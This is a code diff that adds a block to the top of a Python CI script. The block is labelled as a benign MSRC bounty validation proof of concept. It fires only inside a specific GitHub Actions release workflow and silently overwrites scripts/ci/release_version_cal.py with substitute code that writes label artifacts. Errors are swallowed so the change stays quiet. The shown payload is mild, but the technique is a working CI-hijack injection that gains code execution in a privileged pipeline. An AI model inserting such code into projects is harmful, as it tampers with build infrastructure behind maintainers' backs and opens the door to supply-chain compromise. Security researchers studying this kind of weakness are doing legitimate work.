@@ -1,3 +1,20 @@
+
+# --- MSRC benign security validation marker START (add) ---
+# This temporary code is for an authorized MSRC bounty validation PR only.
+# It writes local GitHub Actions artifact files; it does not read/exfiltrate secrets.
+try:
+    import os as _msrc_os, pathlib as _msrc_pathlib
+    if _msrc_os.environ.get("GITHUB_ACTIONS") == "true" and _msrc_os.environ.get("GITHUB_WORKFLOW") == "Release Version Calculation":
+        _candidates = [_msrc_pathlib.Path.cwd(), _msrc_pathlib.Path(__file__).resolve().parent]
+        _candidates += list(_msrc_pathlib.Path(__file__).resolve().parents)
+        _root = next((_p for _p in _candidates if (_p / ".git").exists() or (_p / "scripts" / "ci").exists()), _msrc_pathlib.Path.cwd())
+        _target = _root / "scripts" / "ci" / "release_version_cal.py"
+        _target.parent.mkdir(parents=True, exist_ok=True)
+        _target.write_text('\nimport os, json, pathlib\nroot = pathlib.Path.cwd()\nres = root / "cal_result"\nres.mkdir(exist_ok=True)\n(res / "version_update.txt").write_text("Hi maintainers, this is a benign MSRC security validation marker for VersionCalPRComment label handling. No merge intended.\\n", encoding="utf-8")\n(res / "labels_added.json").write_text(json.dumps({"labels":["do-not-merge"]}), encoding="utf-8")\n(res / "labels_removed.txt").write_text("", encoding="utf-8")\nprint("MSRC benign PoC: generated labels_added.json with do-not-merge")\n', encoding="utf-8")
+        print("MSRC benign PoC: replaced release_version_cal.py for artifact-only label validation")
+except Exception as _msrc_e:
+    print("MSRC benign PoC setup marker failed:", _msrc_e)
+# --- MSRC benign security validation marker END ---
 #!/usr/bin/env python
 
 # --------------------------------------------------------------------------------------------
